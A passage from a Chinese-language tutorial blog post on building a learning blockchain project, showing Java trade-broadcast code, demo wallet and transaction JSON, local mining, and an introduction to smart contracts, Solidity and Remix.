class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Gson</span>().toJson(tradeObject);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PendingServiceImpl.validateTradeNo(tradeObject);</span><br><span class="line">            <span class="type">Pending</span> <span class="variable">pending</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Pending</span>();</span><br><span class="line">            pending.setTradeBody(body);</span><br><span class="line">            pending.setCreateTime(tradeObject.getJsoncreatetime());</span><br><span class="line">            pending.setOrderNo(tradeObject.getHashNo());</span><br><span class="line">            pending.setTradeType(tradeObject.getType());</span><br><span class="line">            PendingServiceImpl.save(pending);</span><br><span class="line">            <span class="keyword">for</span> (String port : map.getFs().keySet()) &#123;</span><br><span class="line">                <span class="type">Friends</span> <span class="variable">f</span> <span class="operator">=</span> map.getFs().get(port);</span><br><span class="line">                <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> f.getIp();</span><br><span class="line">                <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://&quot;</span> + ip + <span class="string">&quot;:8001/data/trade&quot;</span>;</span><br><span class="line">                restTemplate.postForEntity(url, tradeObject, TradeObject.class);</span><br><span class="line">            &#125;</span><br><span class="line">            jo.setCode(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">            jo.setCode(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            jo.setMsg(<span class="string">&quot;失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;JSONObject&gt;(jo, HttpStatus.OK);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>交易接口参数展示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: <span class="string">&quot;0xa0cc1fc72ced8facab08ebe5d6ad5d806ddbd8aa&quot;</span>,</span><br><span class="line">        <span class="string">&quot;to&quot;</span>: <span class="string">&quot;system&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hashNo&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;imgUrl&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>: <span class="string">&quot;good good study,day day up&quot;</span>,</span><br><span class="line">        <span class="string">&quot;blockIndex&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;contentjson&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;jsoncreatetime&quot;</span>: <span class="string">&quot;2024-10-22 10:41:14&quot;</span>,</span><br><span class="line">        <span class="string">&quot;uId&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;annexPath&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;filePath&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;blockHash&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;createTime&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;sign&quot;</span>: <span class="string">&quot;fba08b9a782606b5cfd40c68b24604df2c669bbfa78440b6848ffd826c684b5c58e2b4c7a1db3805dd1e31bb30da233af80cca4edd0cca73e8f8e4dddb452d551c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;contractContent&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;paramStr&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;lastData&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&quot;objToString&quot;</span>: <span class="string">&quot;TradeObject&#123;from=&#x27;0xa0cc1fc72ced8facab08ebe5d6ad5d806ddbd8aa&#x27;, to=&#x27;system&#x27;, type=&#x27;1&#x27;, imgUrl=&#x27;null&#x27;, content=&#x27;good good study,day day up&#x27;, blockIndex=&#x27;null&#x27;, contentjson=&#x27;null&#x27;, jsoncreatetime=&#x27;2024-10-22 10:41:14&#x27;, uId=&#x27;null&#x27;, annexPath=&#x27;null&#x27;, filePath=&#x27;null&#x27;, contractContent=&#x27;null&#x27;, paramStr=&#x27;null&#x27;, lastData=&#x27;null&#x27;&#125;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataStr&quot;</span>: <span class="literal">null</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026143316698.png" alt="image-20241026143316698"></p>
<p>上链完的普通交易详情如图所示</p>
<h3 id="6-实现交易"><a href="#6-实现交易" class="headerlink" title="6. 实现交易"></a>6. 实现交易</h3><p>我们启动项目，访问8001端口的<code>/data/getWallet</code>，获取钱包地址和公私钥</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;生成钱包成功&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;o&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;publicKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2e58fdca4a243486b9ecfd9287e3c56258eaee31761025ebc4acbe636e5c767b453b5465b755b22c1cb572c32e7e98241193b7e8dbe6ed2b6d3eb81668883772&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;privateKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ced6cc51ee0d2063211564e53012aaac4c0b4978e8cc22a11ed998de4e4bcc3b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xed6d1bcb771e59765ab65f43b9406669428af057&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026163252655.png" alt="image-20241026163252655"></p>
<p>发送交易信息</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;privateKey&quot;</span><span class="punctuation">:</span><span class="string">&quot;ced6cc51ee0d2063211564e53012aaac4c0b4978e8cc22a11ed998de4e4bcc3b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;from&quot;</span><span class="punctuation">:</span><span class="string">&quot;0xed6d1bcb771e59765ab65f43b9406669428af057&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026165533515.png" alt="image-20241026165533515"></p>
<p>成功创建和签名交易对象</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;签名成功&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;o&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;from&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xed6d1bcb771e59765ab65f43b9406669428af057&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;to&quot;</span><span class="punctuation">:</span> <span class="string">&quot;system&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;hashNo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;imgUrl&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;blockIndex&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;contentjson&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;jsoncreatetime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-10-26 16:55:19&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;uId&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;annexPath&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;filePath&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;blockHash&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;createTime&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sign&quot;</span><span class="punctuation">:</span> <span class="string">&quot;e653a51fb50421d0e58143342ce0b6c945378581331c247235d5121010926b5560db66b042bc2f01a4a4ff6e9cc2edc3af164a2608e7068cb507f099cd237c971b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;contractContent&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;paramStr&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;lastData&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;objToString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TradeObject&#123;from=&#x27;0xed6d1bcb771e59765ab65f43b9406669428af057&#x27;, to=&#x27;system&#x27;, type=&#x27;1&#x27;, imgUrl=&#x27;null&#x27;, content=&#x27;test&#x27;, blockIndex=&#x27;null&#x27;, contentjson=&#x27;null&#x27;, jsoncreatetime=&#x27;2024-10-26 16:55:19&#x27;, uId=&#x27;null&#x27;, annexPath=&#x27;null&#x27;, filePath=&#x27;null&#x27;, contractContent=&#x27;null&#x27;, paramStr=&#x27;null&#x27;, lastData=&#x27;null&#x27;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataStr&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>发送交易信息进行交易</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;from&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xed6d1bcb771e59765ab65f43b9406669428af057&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;to&quot;</span><span class="punctuation">:</span> <span class="string">&quot;system&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;hashNo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;imgUrl&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;blockIndex&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;contentjson&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;jsoncreatetime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-10-26 16:55:19&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;uId&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;annexPath&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;filePath&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;blockHash&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;createTime&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;sign&quot;</span><span class="punctuation">:</span> <span class="string">&quot;e653a51fb50421d0e58143342ce0b6c945378581331c247235d5121010926b5560db66b042bc2f01a4a4ff6e9cc2edc3af164a2608e7068cb507f099cd237c971b&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;contractContent&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;paramStr&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;lastData&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;objToString&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TradeObject&#123;from=&#x27;0xed6d1bcb771e59765ab65f43b9406669428af057&#x27;, to=&#x27;system&#x27;, type=&#x27;1&#x27;, imgUrl=&#x27;null&#x27;, content=&#x27;test&#x27;, blockIndex=&#x27;null&#x27;, contentjson=&#x27;null&#x27;, jsoncreatetime=&#x27;2024-10-26 16:55:19&#x27;, uId=&#x27;null&#x27;, annexPath=&#x27;null&#x27;, filePath=&#x27;null&#x27;, contractContent=&#x27;null&#x27;, paramStr=&#x27;null&#x27;, lastData=&#x27;null&#x27;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;dataStr&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026165902029.png" alt="image-20241026165902029"></p>
<p>我们直接开挖<code>http://127.0.0.1:8001/starMining</code>，在浏览器打开</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026172149944.png" alt="image-20241026172149944"></p>
<p>可以看到挖到的是我们前面进行的test交易</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026171947590.png" alt="image-20241026171947590"></p>
<h2 id="第二部分：智能合约"><a href="#第二部分：智能合约" class="headerlink" title="第二部分：智能合约"></a>第二部分：智能合约</h2><h3 id="1-智能合约定义"><a href="#1-智能合约定义" class="headerlink" title="1. 智能合约定义"></a>1. 智能合约定义</h3><h4 id="1-1-什么是智能合约："><a href="#1-1-什么是智能合约：" class="headerlink" title="1.1. 什么是智能合约："></a>1.1. 什么是智能合约：</h4><p>智能合约是一种自执行的合约，协议条款直接写入代码中，并存储在区块链上。它能够在特定条件被满足时，自动执行合约的条款。这种合约确保交易的透明性和可信性，因为所有的操作都记录在区块链上，且不可篡改。</p>
<h4 id="1-2-与传统合约的比较："><a href="#1-2-与传统合约的比较：" class="headerlink" title="1.2. 与传统合约的比较："></a>1.2. 与传统合约的比较：</h4><ol>
<li><strong>执行方式</strong>：</li>
</ol>
<ul>
<li><strong>传统合约</strong>：通常需要第三方（如律师）来执行和执行条款。</li>
<li><strong>智能合约</strong>：自动在区块链上执行，无需中介。</li>
</ul>
<ol>
<li><strong>透明性与安全性</strong>：</li>
</ol>
<ul>
<li><strong>传统合约</strong>：可能会因为人为错误或欺诈而受到影响，透明度较低。</li>
<li><strong>智能合约</strong>：所有交易记录透明，且由于区块链的不可篡改性，更加安全。</li>
</ul>
<ol>
<li><strong>成本与效率</strong>：</li>
</ol>
<ul>
<li><strong>传统合约</strong>：涉及中介费用，处理时间较长。</li>
<li><strong>智能合约</strong>：降低了交易成本，提高了执行效率，因为省去了中介的参与。</li>
</ul>
<h3 id="2-工作原理"><a href="#2-工作原理" class="headerlink" title="2. 工作原理"></a>2. 工作原理</h3><h4 id="2-1-区块链技术基础"><a href="#2-1-区块链技术基础" class="headerlink" title="2.1. 区块链技术基础"></a>2.1. 区块链技术基础</h4><ol>
<li><strong>区块链概念</strong>：</li>
</ol>
<ul>
<li><ul>
<li>区块链是一种去中心化的分布式账本技术，能够安全地记录交易和信息。</li>
<li>数据以“区块”的形式存储，每个区块包含一组交易记录，并通过加密技术连接成链。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>去中心化</strong>：</li>
</ol>
<ul>
<li><ul>
<li>区块链网络没有单一控制点，所有节点共同维护账本。</li>
<li>去中心化增强了系统的安全性和抗攻击能力。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>共识机制</strong>：</li>
</ol>
<ul>
<li><ul>
<li>为了确保所有节点对账本的一致性，区块链使用共识机制（如工作量证明、权益证明等）来验证和确认交易。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>不可篡改性</strong>：</li>
</ol>
<ul>
<li><ul>
<li>一旦数据被添加到区块链上，就几乎不可能被修改或删除，确保了交易的真实性和可靠性。</li>
</ul>
</li>
</ul>
<h4 id="2-2-如何执行智能合约"><a href="#2-2-如何执行智能合约" class="headerlink" title="2.2. 如何执行智能合约"></a>2.2. 如何执行智能合约</h4><ol>
<li><strong>合约的编写</strong>：</li>
</ol>
<ul>
<li><ul>
<li>智能合约通常用特定的编程语言（如Solidity）编写，代码中定义了合约的条款和条件。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>部署到区块链</strong>：</li>
</ol>
<ul>
<li><ul>
<li>编写好的智能合约被部署到区块链上，成为网络的一部分。部署后，合约的地址会被记录，任何人都可以与其交互。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>触发条件</strong>：</li>
</ol>
<ul>
<li><ul>
<li>智能合约在特定条件下被触发。例如，某项交易的完成、主动调用，时间的到达等。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>自动执行</strong>：</li>
</ol>
<ul>
<li><ul>
<li>一旦条件满足，智能合约将自动执行合约中的指令，如转账、更新数据等。这一过程不需要任何人的干预。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>记录与验证</strong>：</li>
</ol>
<ul>
<li><ul>
<li>执行的结果会被记录在区块链上，并通过共识机制进行验证，确保每个节点都有相同的信息。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>反馈与更新</strong>：</li>
</ol>
<ul>
<li><ul>
<li>执行完毕后，智能合约可以生成反馈信息，告知相关方执行结果。若合约设计中包括更新逻辑，合约状态也可以相应更新</li>
</ul>
</li>
</ul>
<h3 id="3-常用语言与平台"><a href="#3-常用语言与平台" class="headerlink" title="3. 常用语言与平台"></a>3. 常用语言与平台</h3><h4 id="3-1-Solidity简介"><a href="#3-1-Solidity简介" class="headerlink" title="3.1. Solidity简介"></a>3.1. Solidity简介</h4><ol>
<li><strong>编程语言</strong>：</li>
</ol>
<ul>
<li><ul>
<li>Solidity是一种专门为智能合约开发而设计的高层编程语言。它受到了JavaScript、Python和C++等语言的影响，使得其语法相对易于理解。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>特性</strong>：</li>
</ol>
<ul>
<li><ul>
<li><strong>类型安全</strong>：支持静态类型检查，减少运行时错误。</li>
<li><strong>合约结构</strong>：允许定义合约、库和接口，便于代码的组织和重用。</li>
<li><strong>事件</strong>：提供事件日志功能，便于在区块链上跟踪状态变化和交易。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>开发工具</strong>：</li>
</ol>
<ul>
<li><ul>
<li>常用的开发环境包括Remix、Truffle和Hardhat，这些工具提供了测试、编译和部署的功能，使得开发者能够高效地构建和管理智能合约。</li>
</ul>
</li>
</ul>
<h4 id="3-2-以太坊平台"><a href="#3-2-以太坊平台" class="headerlink" title="3.2. 以太坊平台"></a>3.2. 以太坊平台</h4><ol>
<li><strong>概述</strong>：</li>
</ol>
<ul>
<li><ul>
<li>以太坊是一个开放的区块链平台，支持智能合约和去中心化应用（DApp）的开发。它由Vitalik Buterin于2015年推出，成为最流行的智能合约平台之一。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>虚拟机</strong>：</li>
</ol>
<ul>
<li><ul>
<li>以太坊使用以太坊虚拟机（EVM）来执行智能合约，EVM是一个完全去中心化的执行环境，确保合约在全球所有节点上的一致性。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>原生代币</strong>：</li>
</ol>
<ul>
<li><ul>
<li>以太坊平台的原生代币是以太（ETH），用于支付交易费用和计算资源。用户在调用智能合约时需要支付“Gas”费用。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>生态系统</strong>：</li>
</ol>
<ul>
<li><ul>
<li>以太坊拥有丰富的生态系统，包括去中心化金融（DeFi）、非同质化代币（NFT）、游戏和社交平台等，吸引了大量开发者和用户。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>发展方向</strong>：</li>
</ol>
<ul>
<li><ul>
<li>以太坊已经进行2.0版本更新，采用权益证明（PoS）机制，提高交易速度和降低能耗，同时增强安全性和可扩展性。</li>
</ul>
</li>
</ul>
<h4 id><a href="#" class="headerlink" title></a></h4><h3 id="4-智能合约应用场景"><a href="#4-智能合约应用场景" class="headerlink" title="4. 智能合约应用场景"></a>4. 智能合约应用场景</h3><h4 id="4-1-金融服务"><a href="#4-1-金融服务" class="headerlink" title="4.1. 金融服务"></a>4.1. 金融服务</h4><ul>
<li><p><strong>去中心化金融（DeFi）</strong>：</p>
</li>
<li><ul>
<li>智能合约使得金融产品（如借贷、交易所、衍生品等）可以在去中心化平台上自动执行，无需传统金融中介。用户可以直接在区块链上进行交易，降低费用和提高效率。</li>
</ul>
</li>
<li><p><strong>自动化清算与结算</strong>：</p>
</li>
<li><ul>
<li>在金融交易中，智能合约可以自动处理结算流程，确保交易各方在条件达成时自动进行资金转移和清算，减少人工干预和错误。</li>
</ul>
</li>
<li><p><strong>保险理赔</strong>：</p>
</li>
<li><ul>
<li>智能合约可用于保险行业，自动验证理赔请求并在条件满足时自动支付。这可以加快理赔流程，提高客户满意度。</li>
</ul>
</li>
</ul>
<h4 id="4-2-供应链管理"><a href="#4-2-供应链管理" class="headerlink" title="4.2. 供应链管理"></a>4.2. 供应链管理</h4><ul>
<li><p><strong>透明度与追踪</strong>：</p>
</li>
<li><ul>
<li>智能合约可以记录每个供应链环节的信息，如原材料来源、生产过程、运输状态等。所有参与方都可以实时查看数据，增强透明度和信任。</li>
</ul>
</li>
<li><p><strong>自动执行合同条款</strong>：</p>
</li>
<li><ul>
<li>在供应链中，智能合约能够自动触发付款和交货等操作。例如，当货物到达指定地点时，系统会自动释放付款，确保交易顺利进行。</li>
</ul>
</li>
<li><p><strong>防止伪造与欺诈</strong>：</p>
</li>
<li><ul>
<li>通过在区块链上记录产品的每个环节，智能合约可以帮助品牌防止伪造和欺诈行为，维护品牌声誉。</li>
</ul>
</li>
</ul>
<h4 id="4-3-投票系统"><a href="#4-3-投票系统" class="headerlink" title="4.3. 投票系统"></a>4.3. 投票系统</h4><ul>
<li><p><strong>安全与透明</strong>：</p>
</li>
<li><ul>
<li>智能合约可以用于构建去中心化的投票系统，确保每一票的记录都是安全和透明的。投票结果可在区块链上实时更新，确保投票过程的公正性。</li>
</ul>
</li>
<li><p><strong>减少舞弊行为</strong>：</p>
</li>
<li><ul>
<li>由于区块链的不可篡改性，智能合约能够有效防止投票舞弊，确保每位合格选民只能投一次票，且投票记录无法被修改。</li>
</ul>
</li>
<li><p><strong>快速结果统计</strong>：</p>
</li>
<li><ul>
<li>智能合约能够自动计算和发布投票结果，减少传统投票系统中的人工统计时间，提高效率</li>
</ul>
</li>
</ul>
<h3 id="5-以太坊智能合约"><a href="#5-以太坊智能合约" class="headerlink" title="5. 以太坊智能合约"></a>5. 以太坊智能合约</h3><p>访问下面任一地址即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://remix.ethereum.org/</span><br><span class="line"></span><br><span class="line">https://remix.ethereum.org/#lang=en&amp;optimize=false&amp;runs=200&amp;evmVersion=null&amp;version=soljson-v0.8.26+commit.8a97fa7a.js</span><br></pre></td></tr></table></figure>

<p>来到合约界面</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026144008306.png" alt="image-20241026144008306"></p>
<p>contracts文件夹下有3个.sol文件，就是官方给初学者准备的3个最基础的合约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity &gt;=0.8.2 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title Storage</span><br><span class="line"> * @dev Store &amp; retrieve value in a variable</span><br><span class="line"> * @custom:dev-run-script ./scripts/deploy_with_ethers.ts</span><br><span class="line"> */</span><br><span class="line">contract Storage &#123;</span><br><span class="line"></span><br><span class="line">    uint256 number;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Store value in variable</span><br><span class="line">     * @param num value to store</span><br><span class="line">     */</span><br><span class="line">    function store(uint256 num) public &#123;</span><br><span class="line">        number = num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Return value </span><br><span class="line">     * @return value of &#x27;number&#x27;</span><br><span class="line">     */</span><br><span class="line">    function retrieve() public view returns (uint256)&#123;</span><br><span class="line">        return number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Solidity 合约通常包含以下几个主要部分：</p>
<ol>
<li><strong>SPDX 许可标识</strong>：指定代码的开源许可。</li>
<li><strong>pragma 指令</strong>：声明 Solidity 版本。</li>
<li><strong>导入语句</strong>：引入其他合约或库。</li>
<li><strong>合约声明</strong>：使用 <code>contract</code> 关键字。</li>
<li><strong>状态变量</strong>：存储在区块链上的持久数据。</li>
<li><strong>函数</strong>：合约的可执行代码单元。</li>
</ol>
<p>合约写好了我们对合约进行编译</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026144509165.png" alt="image-20241026144509165"></p>
<p>编译完后，点击左侧部署，来到部署页面，点击deploy，在最下方会出现Deployed Contracts</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026144411259.png" alt="image-20241026144411259"></p>
<p>点击收缩符号，就可以看到合约里拥有的方法，点击就可以对合约方法进行调用。</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026144552743.png" alt="image-20241026144552743"></p>
<h3 id="6-智能合约系统"><a href="#6-智能合约系统" class="headerlink" title="6. 智能合约系统"></a>6. 智能合约系统</h3><p>项目是根据开源项目xxl-job进行修改完成的，项目地址：<code>https://gitee.com/daitoulin/contract_admin.git</code></p>
<p>我们先配置数据库</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026145656398.png" alt="image-20241026145656398"></p>
<p>导入前面第一部分区块链交易学习的项目代码中的sql文件</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026160726959.png" alt="image-20241026160726959"></p>
<p>我们查看下，成功导入</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241026160801151.png" alt="image-20241026160801151"></p>
<h4 id="6-1-启动项目"><a href="#6-1-启动项目" class="headerlink" title="6.1. 启动项目"></a>6.1. 启动项目</h4><p>application.properties配置文件（在<code>contract_admin/xxl-job-admin/src/main/resources/application.properties</code>）</p>
